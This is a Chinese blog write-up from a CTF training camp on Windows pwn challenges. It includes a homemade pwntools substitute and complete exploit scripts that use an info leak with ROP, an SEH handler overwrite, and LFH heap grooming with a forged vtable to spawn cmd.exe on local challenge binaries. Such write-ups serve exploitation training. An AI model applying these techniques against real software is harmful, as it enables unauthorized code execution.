#XMAN day5

by Hence Zhang



第五天的windows pwn的第三题还是有一些难度的，再加上对windbg的不熟悉（windbg好像是有很多莫名其妙的bug）。windows下的pwn和linux下的pwn的不同之处在于，windows一直在更新防护防护机制，新的特性也随着新版本的出现不断迭代。因此，windows没有linux中的漏洞利用中大量的奇技淫巧，但也要求windows 的pwn选手的技能树的快速更新能力。此外，windows的编译和链接过程和linux不一样，windows的binary，栈以及堆都是动态变化的，但是所有程序用的都是同一份核心函数库，所以这也为了信息leak带来了便利。

###windows pwntools

windows上pwntools不能直接安装，这样子我们本地调试的时候就会遇到很大的问题，因此，在windows上简单开发一个pwntools还是挺重要的。在这里我对冠成大佬的pwintools进行了少量的修改，增加了p32，p64，u32，u64的基本函数功能。此外，因为原来的函数未带有进程关闭功能，很容易出现多个僵尸进程耗尽系统资源的问题，通过process.close()的方法可以解决这个问题。

使用pwintools，需要安装psutil。

下载地址：https://pypi.python.org/packages/b9/aa/b779310ee8a120b5bb90880d22e7b3869f98f7a30381a71188c6fb7ff4a6/psutil-5.2.2.win32-py2.7.exe#md5=2068931b6b2ecd9374f9fc5fe0da652f

***pwintools***

```python
from subprocess import Popen, PIPE, call
import threading, sys
from struct import unpack,pack
import os
import signal
import psutil
'''
this is a self defined class as a simple pwntool replacement
when there is not intalled pwntool 
'''

class process:
    def __init__(self, cmd):
        self.pipe = Popen(cmd, stdin = PIPE, stdout = PIPE, shell = True)
 
    def sendline(self, delims):
        return self.pipe.stdin.write(delims + '\n')
 
    def send(self, delims):
        return self.pipe.stdin.write(delims)

    def get_child_pid(self):
        pid = self.pipe.pid
        for p in psutil.process_iter():
            if p.pid == pid:
                return p.children()[0].pid

    def close(self):
        return os.kill(self.get_child_pid(), signal.SIGINT)
     
    def recv(self, count):
        return self.pipe.stdout.read(count)
 
    def recvline(self):
        return self.pipe.stdout.readline()
 
    def recvuntil(self, delims):
        buf = ''
        while delims not in buf:
            buf += self.recv(1)
        return buf
 
    def recvline_startswith(self, delims):
        buf = ''
        while '\n' + delims not in buf:
            buf += self.read(1)
         
        while True:
            tmp = self.read(1)
            buf += tmp
            if buf == '\n':
                break
        return buf
 
    def interactive(self):
        print 'Switching to interative mode'
        go = threading.Event()
        def recv_thread():
            while not go.isSet():
                try:
                    cur = self.recv(1)
                    sys.stdout.write(cur)
                    sys.stdout.flush()
                except EOFError:
                    print 'Got EOF while reading in interactive'
                    break
        t = threading.Thread(target = recv_thread)
        t.setDaemon(True)
        t.start()
        while self.pipe:
            print '$ ',
            while True:
                data = sys.stdin.read(1)
                self.send(data)
                if data == '\n':
                    break

def u32(data):
    return unpack("<I",data)[0]

def p32(data):
    return pack("<I",data)

def u64(data):
    return unpack("<Q",data)[0]

def p64(data):
    return pack("<Q",data)
```







###babyrop

这题的主要作用是熟悉windows，通过infoleak找到system和cmd.exe的地址。找到相应的偏移后，直接使用ROP。

```python
from pwintools import *

p = process("babyrop.exe")
print p.recvuntil("\n")
p.send("A"*24 + "\n")
print p.recvuntil("A"*24)
tmp_addr = u32(p.recvuntil("\n")[:4])
print "tmp_addr => " + hex(tmp_addr)

system_addr = tmp_addr + 0x45483
print "system_addr => " + hex(system_addr)

cmd_addr = tmp_addr + 0x25e81
print "cmd_addr => " + hex(cmd_addr)

offset = 0xd0

raw_input("############")
payload =  "B"*offset + p32(system_addr) + p32(0xdeadbeef) + p32(cmd_addr)
p.send(str(len(payload))+"\n")
p.send(payload + "\n")
p.interactive()
```

###babyseh

这题与上一题不同的地方是开启了栈保护，但也开了seh，因此我们不需要覆盖函数返回地址，只需要覆盖掉seh的异常处理函数，然后通过触发异常获取shell。需要注意的seh链存在检查，因此，要覆盖异常处理函数之前，必须保证它的next指针是正确的。

```python
from pwintools import *

p = process("babyrop2.exe")
print p.recvuntil("\n")
p.send("A"*68 + "\n")
print p.recvuntil("A"*68)
tmp_addr = p.recvuntil("\n")[:4]
if tmp_addr[3]=='\x0d':
    tmp_addr = tmp_addr[:3] + '\x00'
binary_base_addr = u32(tmp_addr)>>16 << 16
print "binary_base_addr => " + hex(binary_base_addr)
shell_addr = binary_base_addr + 0x1117
print "shell_addr => " + hex(shell_addr)

p = process("babyrop2.exe")
print p.recvuntil("\n")
p.send("A"*72 + "\n")
print p.recvuntil("A"*72)
tmp_addr = p.recvuntil("\n")[:4]
if tmp_addr[3]=='\x0d':
    tmp_addr = tmp_addr[:3] + '\x00'
stack_addr = u32(tmp_addr)
print "stack_addr => " + hex(stack_addr)

raw_input("$$$$$$$$$$$$$")

exchain_1_offset = 0x7afa80 - 0x7afa4c
exchain_2_offset = 0x7afadc - 0x7afa4c
exchain_1_addr = stack_addr + exchain_1_offset
exchain_2_addr = stack_addr + exchain_2_offset
print "exchain_1_addr => " + hex(exchain_1_addr)
print "exchain_2_addr => " + hex(exchain_2_addr)

overflow_offset = 0xc3f9bc - 0xc3f8b8  

payload  = "B"*overflow_offset + p32(exchain_2_addr) + p32(shell_addr)
payload += "C" * 7000

print p.recvuntil("\n")
p.send(str(len(payload))+"\n")
p.send(payload + "\n")
p.interactive()
```



###babyvtable

这题我的大致思路是，首先通过连续分配0x51次堆空间，触发windows的LFH。在windows开起LEH后，我们才能通过msg内容的溢出，溢出在其之后的通过new实例化的类的堆空间（在开启LFH后，msg的堆才可能在其之前的空间），然后覆写掉他的虚函数表指针。

又因为虚函数表的后1.5 bytes不随ASLR变化而变化，我们可以通过信息泄露时搜索该1.5 bytes来确定虚函数表的偏移。并进一步通过虚函数表的地址获取binary的基址和堆的基址。

然后我们在堆上伪造一个虚函数表，将指针指向它，这个虚函数表中填的地址是精心构造的gadget，通过该gadget我们拉高栈指针，指向我们我们之后的输入（就在现在的栈附近，最后通过pop rcx ret（windows先使用rcx传参），返回到system函数执行system("cmd.exe")。代码如下：

```python
from pwintools import *

def create(length):
    p.recvuntil("option")
    p.send("1\n")
    p.recvuntil("Option")
    p.send("2\n")
    p.recvuntil("size")
    p.send(str(length) + "\n")
    p.recvuntil("done")

def view(length):
    p.recvuntil("option")
    p.send("2\n")
    p.recvuntil("len")
    p.recvuntil("\n")
    p.send(str(1024) + "\n")
    tmp = p.recv(length)
    p.recvuntil("done")
    return tmp

def update(string):
    p.recvuntil("option")
    p.send("3\n")
    p.recvuntil("len")
    p.send(str(len(string)) + "\n")
    p.recvuntil("msg")
    p.send(string + "\n")
    
p = process("babyvtable.exe")

for i in range(0x51):
    create(16)

flag = 1
print view(1024)

while flag:
    create(16)
    #update("CCCC")
    tmp = view(1024)
    print "next"
    for i in range(1024):
        #print tmp[i].encode("hex")
        if ord(tmp[i])==0xf0 and (ord(tmp[i+1]) & 0xf == 0x3):
            vtable_addr = u64(tmp[i:i+8])
            j = i + 8
            msg_addr = u64(tmp[j:j+8])
            print "vtable_addr => " + hex(vtable_addr)
            print "msg_addr => " + hex(msg_addr)
            flag = 0
            break
offset = i/8
print "offset => " + str(offset)
binary_base = vtable_addr - 0x33f0
print "binary_base => " + hex(binary_base)
system_addr = binary_base + 0x7127d6370
print "system_addr => " + hex(system_addr)
cmd_addr = binary_base + 0x7127f7f38
print "cmd_addr => " + hex(cmd_addr)
add_esp_0x38_addr = binary_base + 0x7127335bc
print "add_esp_0x38_addr => " + hex(add_esp_0x38_addr)
pop_rcx_ret_addr = binary_base + 0x712757f30
print "pop_rcx_ret_addr => " + hex(pop_rcx_ret_addr)
vtable_point_addr = msg_addr + offset * 8
print "vtable_point_addr => " + hex(vtable_point_addr)

padding = '\x90' * 8
payload = p64(add_esp_0x38_addr) + padding * (offset-1) + p64(msg_addr)  
update(payload)
#raw_input("################")
p.send("2DDDDDDD" + p64(pop_rcx_ret_addr) + p64(cmd_addr) + p64(system_addr) + "\n")
try:
    p.interactive()
except Exception,e:
    print e
    p.close()
```

但是，这个payload的成功率在%30左右。一是地址匹配0x3f0可能出错，这个撞上的概率还是蛮大的。另一原因我现在也没弄明白，但可以确定的是system和cmd.exe都是传递没有问题的。通过windbg跟下去，会报出一些奇怪的错误，一部分错误并不影响运行，重新g一下即可。但在cmd.exe运行时这些错误确是致命的。所以最后成功率偏低。